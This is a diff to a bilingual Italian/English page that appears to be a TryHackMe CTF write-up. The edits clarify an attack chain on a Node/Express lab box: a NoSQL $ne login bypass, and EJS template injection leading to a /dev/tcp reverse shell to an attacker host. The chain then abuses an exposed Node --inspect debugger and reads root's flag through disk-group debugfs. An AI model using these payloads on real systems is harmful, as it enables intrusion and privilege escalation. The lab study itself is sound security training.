@@ -137,7 +137,7 @@
   "headline":"Do Not Disturb: NoSQL, SSTI e Node inspector",
   "description":"Writeup TryHackMe Do Not Disturb: bypass login NoSQL injection, SSTI EJS, RCE e privesc via Node --inspect e gruppo disk. Boot2root Node/Express.",
   "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/og.png"],"datePublished":"2026-08-02T09:00:00+02:00","dateModified":"2026-08-02T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
-  "keywords":"TryHackMe, Hacker Holidays 2026, Do Not Disturb, Boot2root, TryHackMe, CTF walkthrough",
+  "keywords":"TryHackMe, Hacker Holidays 2026, Do Not Disturb, Boot2root, CTF walkthrough",
   "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/do-not-disturb/",
   "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
   "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
@@ -173,7 +173,6 @@
   <div class="article-header">
     <div class="article-meta">
       <span class="tag">Boot2root</span><span class="tag">TryHackMe</span>
-      <span class="tag">TryHackMe</span>
       <time class="meta-item" datetime="2026-08-02" data-it="02 Ago 2026" data-en="02 Aug 2026">02 Ago 2026</time>
       <span class="meta-item" data-it="8 min di lettura" data-en="8 min read">8 min di lettura</span>
       <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
@@ -191,7 +190,7 @@
 
     <div class="callout">
       <div class="callout-label" data-it="// prima di iniziare" data-en="// before you start">// prima di iniziare</div>
-      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina, &lt;code&gt;&amp;lt;attacker&amp;gt;&lt;/code&gt; con il tuo IP sulla VPN (&lt;code&gt;ip a show tun0&lt;/code&gt;) e &lt;code&gt;&amp;lt;cookie&amp;gt;&lt;/code&gt; con il &lt;code&gt;connect.sid&lt;/code&gt; che ricevi al login. Il listener gira sulla &lt;strong&gt;tua&lt;/strong&gt; macchina; il client CDP del passo &lt;code&gt;[04]&lt;/code&gt; si scrive &lt;strong&gt;sul target&lt;/strong&gt;. Servono: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;ffuf&lt;/code&gt;, &lt;code&gt;netcat&lt;/code&gt; e Node ≥ 22 (sotto: &lt;code&gt;npm i ws&lt;/code&gt;)." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP, &lt;code&gt;&amp;lt;attacker&amp;gt;&lt;/code&gt; for your VPN IP (&lt;code&gt;ip a show tun0&lt;/code&gt;) and &lt;code&gt;&amp;lt;cookie&amp;gt;&lt;/code&gt; for the &lt;code&gt;connect.sid&lt;/code&gt; you get at login. The listener runs on &lt;strong&gt;your&lt;/strong&gt; machine; the CDP client in step &lt;code&gt;[04]&lt;/code&gt; is written &lt;strong&gt;on the target&lt;/strong&gt;. You need: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;ffuf&lt;/code&gt;, &lt;code&gt;netcat&lt;/code&gt; and Node ≥ 22 (below that: &lt;code&gt;npm i ws&lt;/code&gt;).">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina, <code>&lt;attacker&gt;</code> con il tuo IP sulla VPN (<code>ip a show tun0</code>) e <code>&lt;cookie&gt;</code> con il <code>connect.sid</code> che ricevi al login. Il listener gira sulla <strong>tua</strong> macchina; il client CDP del passo <code>[04]</code> si scrive <strong>sul target</strong>. Servono: <code>curl</code>, <code>ffuf</code>, <code>netcat</code> e Node ≥ 22 (sotto: <code>npm i ws</code>).</p>
+      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina, &lt;code&gt;&amp;lt;attacker&amp;gt;&lt;/code&gt; con il tuo IP sulla VPN (&lt;code&gt;ip a show tun0&lt;/code&gt;) e &lt;code&gt;&amp;lt;cookie&amp;gt;&lt;/code&gt; con il &lt;code&gt;connect.sid&lt;/code&gt; che ricevi al login. Il listener gira sulla &lt;strong&gt;tua&lt;/strong&gt; macchina; il client CDP del passo &lt;code&gt;[04]&lt;/code&gt; si scrive &lt;strong&gt;sul target&lt;/strong&gt;. Sul tuo box: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;ffuf&lt;/code&gt;, &lt;code&gt;netcat&lt;/code&gt;. Sul target: Node — se è ≥ 22 c&#x27;è &lt;code&gt;WebSocket&lt;/code&gt; globale, altrimenti serve il modulo &lt;code&gt;ws&lt;/code&gt; (vedi &lt;code&gt;[04]&lt;/code&gt;)." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP, &lt;code&gt;&amp;lt;attacker&amp;gt;&lt;/code&gt; for your VPN IP (&lt;code&gt;ip a show tun0&lt;/code&gt;) and &lt;code&gt;&amp;lt;cookie&amp;gt;&lt;/code&gt; for the &lt;code&gt;connect.sid&lt;/code&gt; you get at login. The listener runs on &lt;strong&gt;your&lt;/strong&gt; machine; the CDP client in step &lt;code&gt;[04]&lt;/code&gt; is written &lt;strong&gt;on the target&lt;/strong&gt;. On your box: &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;ffuf&lt;/code&gt;, &lt;code&gt;netcat&lt;/code&gt;. On the target: Node — if it&#x27;s ≥ 22 there&#x27;s a global &lt;code&gt;WebSocket&lt;/code&gt;, otherwise you need the &lt;code&gt;ws&lt;/code&gt; module (see &lt;code&gt;[04]&lt;/code&gt;).">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina, <code>&lt;attacker&gt;</code> con il tuo IP sulla VPN (<code>ip a show tun0</code>) e <code>&lt;cookie&gt;</code> con il <code>connect.sid</code> che ricevi al login. Il listener gira sulla <strong>tua</strong> macchina; il client CDP del passo <code>[04]</code> si scrive <strong>sul target</strong>. Sul tuo box: <code>curl</code>, <code>ffuf</code>, <code>netcat</code>. Sul target: Node — se è ≥ 22 c'è <code>WebSocket</code> globale, altrimenti serve il modulo <code>ws</code> (vedi <code>[04]</code>).</p>
     </div>
 
     <h2 data-it="[01] Recon: due porte e un 403 parlante" data-en="[01] Recon: two ports and a talkative 403" id='recon'>[01] Recon: due porte e un 403 parlante</h2>
@@ -241,7 +240,7 @@
 <span class="comment"># HTTP/1.1 302 Found</span>
 # Set-Cookie: <span class="ok">connect.sid=s%3A...</span></pre>
 </div></div>
-    <p data-it="&lt;code&gt;$ne&lt;/code&gt; vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale." data-en="&lt;code&gt;$ne&lt;/code&gt; means &quot;not equal&quot;. The query becomes &quot;find me a user whose username isn't empty and whose password isn't empty&quot;: that's everyone. The server hands me a valid session without my knowing a single credential."><code>$ne</code> vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale.</p>
+    <p data-it="&lt;code&gt;$ne&lt;/code&gt; vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale. Il wallet che ballava era esattamente questo: chiunque poteva loggarsi come chiunque." data-en="&lt;code&gt;$ne&lt;/code&gt; means &quot;not equal&quot;. The query becomes &quot;find me a user whose username isn't empty and whose password isn't empty&quot;: that's everyone. The server hands me a valid session without my knowing a single credential. The wallet that kept dancing was exactly this: anyone could log in as anyone."><code>$ne</code> vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale. Il wallet che ballava era esattamente questo: chiunque poteva loggarsi come chiunque.</p>
     <p data-it="Quel &lt;code&gt;Set-Cookie&lt;/code&gt; è la mia chiave per &lt;code&gt;/staff&lt;/code&gt;: da qui in poi tutto passa da lì. Copio il valore di &lt;code&gt;connect.sid&lt;/code&gt; dall'header della risposta 302 e lo riuso come header &lt;code&gt;Cookie&lt;/code&gt; nelle richieste successive — oppure lascio che sia &lt;code&gt;curl&lt;/code&gt; a tenermi un barattolo di cookie, così non lo tocco a mano." data-en="That &lt;code&gt;Set-Cookie&lt;/code&gt; is my key to &lt;code&gt;/staff&lt;/code&gt;: from here on everything rides on it. I copy the &lt;code&gt;connect.sid&lt;/code&gt; value from the 302 response header and reuse it as a &lt;code&gt;Cookie&lt;/code&gt; header on the next requests — or I let &lt;code&gt;curl&lt;/code&gt; keep a cookie jar for me, so I never touch it by hand.">Quel <code>Set-Cookie</code> è la mia chiave per <code>/staff</code>: da qui in poi tutto passa da lì. Copio il valore di <code>connect.sid</code> dall'header della risposta 302 e lo riuso come header <code>Cookie</code> nelle richieste successive — oppure lascio che sia <code>curl</code> a tenermi un barattolo di cookie, così non lo tocco a mano.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># opzione A: salvo la sessione in un barattolo alla login...</span>
@@ -272,7 +271,18 @@
 </div>
 
     <h2 data-it="[03] SSTI in EJS: da template a shell" data-en="[03] EJS SSTI: from template to shell" id='ssti'>[03] SSTI in EJS: da template a shell</h2>
-    <p data-it="Con il cookie &lt;code&gt;/staff&lt;/code&gt; si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Testo subito l'ovvio." data-en="With the cookie, &lt;code&gt;/staff&lt;/code&gt; opens: it's the &quot;Cabana Desk&quot; console, with a form to customise the booking-confirmation message. The message is an EJS template, and it lets me write it. I test the obvious first.">Con il cookie <code>/staff</code> si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Testo subito l'ovvio.</p>
+    <p data-it="Con il cookie &lt;code&gt;/staff&lt;/code&gt; si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Ma prima leggo l'HTML del form: dove postare e come si chiama il campo." data-en="With the cookie, &lt;code&gt;/staff&lt;/code&gt; opens: it's the &quot;Cabana Desk&quot; console, with a form to customise the booking-confirmation message. The message is an EJS template, and it lets me write it. But first I read the form's HTML: where to POST and what the field is called.">Con il cookie <code>/staff</code> si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Ma prima leggo l'HTML del form: dove postare e come si chiama il campo.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">curl -s -b cookies.txt http://&lt;target&gt;/staff | grep -iE 'form|action|name='</span>
+<span class="comment"># &lt;form action="/staff/preview" method="POST"&gt;</span>
+<span class="comment">#   &lt;textarea name="template"&gt;&lt;/textarea&gt;</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">curl -s -b cookies.txt http://&lt;target&gt;/staff | grep -iE 'form|action|name='</span>
+<span class="comment"># &lt;form action="/staff/preview" method="POST"&gt;</span>
+<span class="comment">#   &lt;textarea name="template"&gt;&lt;/textarea&gt;</span></pre>
+</div></div>
+    <p data-it="Ecco l&#x27;&lt;code&gt;action&lt;/code&gt; e il &lt;code&gt;name&lt;/code&gt;: POST su &lt;code&gt;/staff/preview&lt;/code&gt;, campo &lt;code&gt;template&lt;/code&gt;. Ora testo l&#x27;ovvio." data-en="There&#x27;s the &lt;code&gt;action&lt;/code&gt; and the &lt;code&gt;name&lt;/code&gt;: POST to &lt;code&gt;/staff/preview&lt;/code&gt;, field &lt;code&gt;template&lt;/code&gt;. Now I test the obvious.">Ecco l'<code>action</code> e il <code>name</code>: POST su <code>/staff/preview</code>, campo <code>template</code>. Ora testo l'ovvio.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
 <span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
@@ -301,24 +311,24 @@
 </div></div>
     <p data-it="RCE come &lt;code&gt;poolside&lt;/code&gt;. Da qui una shell è una formalità: metto un listener e cambio &lt;code&gt;id&lt;/code&gt; con una reverse shell, stesso &lt;code&gt;--data-urlencode&lt;/code&gt;, stesso cookie." data-en="RCE as &lt;code&gt;poolside&lt;/code&gt;. From here a shell is a formality: I set up a listener and swap &lt;code&gt;id&lt;/code&gt; for a reverse shell, same &lt;code&gt;--data-urlencode&lt;/code&gt;, same cookie.">RCE come <code>poolside</code>. Da qui una shell è una formalità: metto un listener e cambio <code>id</code> con una reverse shell, stesso <code>--data-urlencode</code>, stesso cookie.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="comment"># sul mio box: listener in ascolto</span>
+<pre><span class="comment"># terminale 1 — il mio box: listener in ascolto</span>
 <span class="neutral">nc -lvnp 4444</span>
 <span class="neutral"></span>
-<span class="comment"># stesso endpoint /staff/preview, ma il payload è una reverse shell</span>
+<span class="comment"># terminale 2 — il mio box: stesso endpoint /staff/preview, payload = reverse shell</span>
 <span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
 <span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
 <span class="neutral">  --data-urlencode "template=&lt;%= global.process.mainModule.require('child_process').execSync(\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1'\").toString() %&gt;"</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="comment"># on my box: listener up</span>
+<pre><span class="comment"># terminal 1 — my box: listener up</span>
 <span class="neutral">nc -lvnp 4444</span>
 <span class="neutral"></span>
-<span class="comment"># same /staff/preview endpoint, but the payload is a reverse shell</span>
+<span class="comment"># terminal 2 — my box: same /staff/preview endpoint, payload = reverse shell</span>
 <span class="neutral">curl -s -X POST http://&lt;target&gt;/staff/preview \</span>
 <span class="neutral">  -H "Cookie: connect.sid=&lt;cookie&gt;" \</span>
 <span class="neutral">  --data-urlencode "template=&lt;%= global.process.mainModule.require('child_process').execSync(\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker&gt;/4444 0&gt;&amp;1'\").toString() %&gt;"</span></pre>
 </div></div>
-    <p data-it="Connessione in arrivo: shell come &lt;code&gt;poolside&lt;/code&gt;. La user flag è a portata di &lt;code&gt;cat&lt;/code&gt;." data-en="Connection back: a shell as &lt;code&gt;poolside&lt;/code&gt;. The user flag is a &lt;code&gt;cat&lt;/code&gt; away.">Connessione in arrivo: shell come <code>poolside</code>. La user flag è a portata di <code>cat</code>.</p>
+    <p data-it="La curl resta appesa: è normale, &lt;code&gt;execSync&lt;/code&gt; non ritorna finché la shell è viva — l&#x27;output arriva nel terminale del listener. Connessione in arrivo: shell come &lt;code&gt;poolside&lt;/code&gt;. La user flag è a portata di &lt;code&gt;cat&lt;/code&gt;." data-en="The curl just hangs: that is expected — &lt;code&gt;execSync&lt;/code&gt; does not return while the shell is alive, the output lands in the listener terminal. Connection back: a shell as &lt;code&gt;poolside&lt;/code&gt;. The user flag is a &lt;code&gt;cat&lt;/code&gt; away.">La curl resta appesa: è normale, <code>execSync</code> non ritorna finché la shell è viva — l'output arriva nel terminale del listener. Connessione in arrivo: shell come <code>poolside</code>. La user flag è a portata di <code>cat</code>.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="neutral">find / -name user.txt 2&gt;/dev/null</span>
 <span class="neutral">cat /home/poolside/user.txt</span>
@@ -337,12 +347,12 @@
     <h2 data-it="[04] Da poolside a root: Node --inspect e gruppo disk" data-en="[04] From poolside to root: Node --inspect and the disk group" id='root'>[04] Da poolside a root: Node --inspect e gruppo disk</h2>
     <p data-it="&lt;code&gt;sudo -l&lt;/code&gt; vuole una password che non ho: vicolo cieco. Allora guardo cosa gira sulla macchina, ed ecco l'errore di qualcun altro." data-en="&lt;code&gt;sudo -l&lt;/code&gt; wants a password I don't have: dead end. So I look at what's running on the box, and there it is, someone else's mistake."><code>sudo -l</code> vuole una password che non ho: vicolo cieco. Allora guardo cosa gira sulla macchina, ed ecco l'errore di qualcun altro.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="neutral">sudo -l                      # chiede una password: stop</span>
+<pre><span class="neutral">sudo -l                      # senza tty: «no tty present», comunque vicolo cieco</span>
 <span class="neutral">ps aux | grep -i node</span>
 # pipelin+ ... /usr/bin/node <span class="danger">--inspect=127.0.0.1:9229</span> processor.js</pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="neutral">sudo -l                      # asks for a password: stop</span>
+<pre><span class="neutral">sudo -l                      # no tty: "no tty present", dead end anyway</span>
 <span class="neutral">ps aux | grep -i node</span>
 # pipelin+ ... /usr/bin/node <span class="danger">--inspect=127.0.0.1:9229</span> processor.js</pre>
 </div></div>
@@ -355,10 +365,10 @@
 <pre><span class="neutral">curl -s http://127.0.0.1:9229/json/list</span>
 <span class="comment"># "webSocketDebuggerUrl": "ws://127.0.0.1:9229/&lt;uuid&gt;"</span></pre>
 </div></div>
-    <p data-it="Scrivo un piccolo client WebSocket in Node: legge da solo il &lt;code&gt;webSocketDebuggerUrl&lt;/code&gt;, apre la connessione, invia un comando &lt;code&gt;Runtime.evaluate&lt;/code&gt; e stampa il risultato. È solo protocollo, un handshake e un JSON. Node 22+ espone già &lt;code&gt;WebSocket&lt;/code&gt; come globale; su versioni più vecchie mi basta un &lt;code&gt;npm i ws&lt;/code&gt; nella cartella da cui lancio lo script. Il debugger esegue nel contesto di &lt;code&gt;pipelinesvc&lt;/code&gt;." data-en="I write a small Node WebSocket client: it reads the &lt;code&gt;webSocketDebuggerUrl&lt;/code&gt; itself, opens the connection, sends a &lt;code&gt;Runtime.evaluate&lt;/code&gt; command and prints the result. It's just protocol, a handshake and some JSON. Node 22+ already exposes &lt;code&gt;WebSocket&lt;/code&gt; as a global; on older versions a single &lt;code&gt;npm i ws&lt;/code&gt; in the folder I launch the script from is enough. The debugger runs in the context of &lt;code&gt;pipelinesvc&lt;/code&gt;.">Scrivo un piccolo client WebSocket in Node: legge da solo il <code>webSocketDebuggerUrl</code>, apre la connessione, invia un comando <code>Runtime.evaluate</code> e stampa il risultato. È solo protocollo, un handshake e un JSON. Node 22+ espone già <code>WebSocket</code> come globale; su versioni più vecchie mi basta un <code>npm i ws</code> nella cartella da cui lancio lo script. Il debugger esegue nel contesto di <code>pipelinesvc</code>.</p>
+    <p data-it="Scrivo un piccolo client WebSocket in Node: legge da solo il &lt;code&gt;webSocketDebuggerUrl&lt;/code&gt;, apre la connessione, invia un comando &lt;code&gt;Runtime.evaluate&lt;/code&gt; e stampa il risultato. È solo protocollo, un handshake e un JSON. Node 22+ espone già &lt;code&gt;WebSocket&lt;/code&gt; come globale; su versioni più vecchie serve il modulo &lt;code&gt;ws&lt;/code&gt; nella stessa cartella dello script (&lt;code&gt;cd /tmp&lt;/code&gt;, poi &lt;code&gt;npm i ws&lt;/code&gt;). Su un box offline riuso i &lt;code&gt;node_modules&lt;/code&gt; già presenti sul target: &lt;code&gt;NODE_PATH=/percorso/app/node_modules node /tmp/cdp.js &quot;id&quot;&lt;/code&gt;. Il debugger esegue nel contesto di &lt;code&gt;pipelinesvc&lt;/code&gt;." data-en="I write a small Node WebSocket client: it reads the &lt;code&gt;webSocketDebuggerUrl&lt;/code&gt; itself, opens the connection, sends a &lt;code&gt;Runtime.evaluate&lt;/code&gt; command and prints the result. It's just protocol, a handshake and some JSON. Node 22+ already exposes &lt;code&gt;WebSocket&lt;/code&gt; as a global; on older versions you need the &lt;code&gt;ws&lt;/code&gt; module in the same folder as the script (&lt;code&gt;cd /tmp&lt;/code&gt;, then &lt;code&gt;npm i ws&lt;/code&gt;). On an offline box I reuse the &lt;code&gt;node_modules&lt;/code&gt; already present on the target: &lt;code&gt;NODE_PATH=/path/to/app/node_modules node /tmp/cdp.js &quot;id&quot;&lt;/code&gt;. The debugger runs in the context of &lt;code&gt;pipelinesvc&lt;/code&gt;.">Scrivo un piccolo client WebSocket in Node: legge da solo il <code>webSocketDebuggerUrl</code>, apre la connessione, invia un comando <code>Runtime.evaluate</code> e stampa il risultato. È solo protocollo, un handshake e un JSON. Node 22+ espone già <code>WebSocket</code> come globale; su versioni più vecchie serve il modulo <code>ws</code> nella stessa cartella dello script (<code>cd /tmp</code>, poi <code>npm i ws</code>). Su un box offline riuso i <code>node_modules</code> già presenti sul target: <code>NODE_PATH=/percorso/app/node_modules node /tmp/cdp.js "id"</code>. Il debugger esegue nel contesto di <code>pipelinesvc</code>.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># scrivo il client CDP sul box (Node &gt;=22 ha WebSocket globale;</span>
-<span class="comment"># altrimenti, nella stessa cartella: npm i ws)</span>
+<span class="comment"># altrimenti nella stessa cartella dello script: cd /tmp; npm i ws)</span>
 <span class="neutral">cat &gt; /tmp/cdp.js &lt;&lt;'EOF'</span>
 <span class="neutral">const cp = require('child_process');</span>
 <span class="neutral">const url = cp.execSync("curl -s http://127.0.0.1:9229/json/list")</span>
@@ -383,7 +393,7 @@
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># write the CDP client on the box (Node &gt;=22 ships a global WebSocket;</span>
-<span class="comment"># otherwise, in the same folder: npm i ws)</span>
+<span class="comment"># otherwise in the same folder as the script: cd /tmp; npm i ws)</span>
 <span class="neutral">cat &gt; /tmp/cdp.js &lt;&lt;'EOF'</span>
 <span class="neutral">const cp = require('child_process');</span>
 <span class="neutral">const url = cp.execSync("curl -s http://127.0.0.1:9229/json/list")</span>
@@ -417,16 +427,18 @@
     <p data-it="Pivot da &lt;code&gt;poolside&lt;/code&gt; a &lt;code&gt;pipelinesvc&lt;/code&gt; senza toccarne la password. E &lt;code&gt;pipelinesvc&lt;/code&gt; è nel gruppo &lt;code&gt;disk&lt;/code&gt;: qui la partita è già decisa." data-en="Pivot from &lt;code&gt;poolside&lt;/code&gt; to &lt;code&gt;pipelinesvc&lt;/code&gt; without touching its password. And &lt;code&gt;pipelinesvc&lt;/code&gt; is in the &lt;code&gt;disk&lt;/code&gt; group: at this point the game is already decided.">Pivot da <code>poolside</code> a <code>pipelinesvc</code> senza toccarne la password. E <code>pipelinesvc</code> è nel gruppo <code>disk</code>: qui la partita è già decisa.</p>
     <p data-it="Il gruppo &lt;code&gt;disk&lt;/code&gt; dà lettura sui device a blocchi grezzi, e questo scavalca del tutto i permessi del filesystem: leggo i &lt;em&gt;byte del disco&lt;/em&gt;, non i file. Non serve essere root, basta &lt;code&gt;debugfs&lt;/code&gt; sul device giusto. E ogni comando lo passo dallo stesso &lt;code&gt;/tmp/cdp.js&lt;/code&gt;, così gira come &lt;code&gt;pipelinesvc&lt;/code&gt;." data-en="The &lt;code&gt;disk&lt;/code&gt; group grants read access to raw block devices, and that bypasses filesystem permissions entirely: I read the &lt;em&gt;bytes of the disk&lt;/em&gt;, not the files. No need to be root, just &lt;code&gt;debugfs&lt;/code&gt; on the right device. And I route every command through the same &lt;code&gt;/tmp/cdp.js&lt;/code&gt;, so it runs as &lt;code&gt;pipelinesvc&lt;/code&gt;.">Il gruppo <code>disk</code> dà lettura sui device a blocchi grezzi, e questo scavalca del tutto i permessi del filesystem: leggo i <em>byte del disco</em>, non i file. Non serve essere root, basta <code>debugfs</code> sul device giusto. E ogni comando lo passo dallo stesso <code>/tmp/cdp.js</code>, così gira come <code>pipelinesvc</code>.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="neutral">node /tmp/cdp.js "cat /proc/partitions"</span>
-<span class="comment"># ... nvme0n1p1    &lt;- partizione root</span>
+<pre><span class="neutral">node /tmp/cdp.js "findmnt -no SOURCE /"</span>
+<span class="comment"># /dev/nvme0n1p1    &lt;- device di root (sul tuo box può essere sda1, vda1...)</span>
 <span class="neutral"></span>
+<span class="comment"># riuso quel device qui; se «debugfs: not found» chiama /usr/sbin/debugfs</span>
 <span class="neutral">node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2&gt;&amp;1"</span>
 # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="neutral">node /tmp/cdp.js "cat /proc/partitions"</span>
-<span class="comment"># ... nvme0n1p1    &lt;- root partition</span>
+<pre><span class="neutral">node /tmp/cdp.js "findmnt -no SOURCE /"</span>
+<span class="comment"># /dev/nvme0n1p1    &lt;- root device (on your box it may be sda1, vda1...)</span>
 <span class="neutral"></span>
+<span class="comment"># reuse that device here; if you get "debugfs: not found", call /usr/sbin/debugfs</span>
 <span class="neutral">node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2&gt;&amp;1"</span>
 # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
 </div></div>
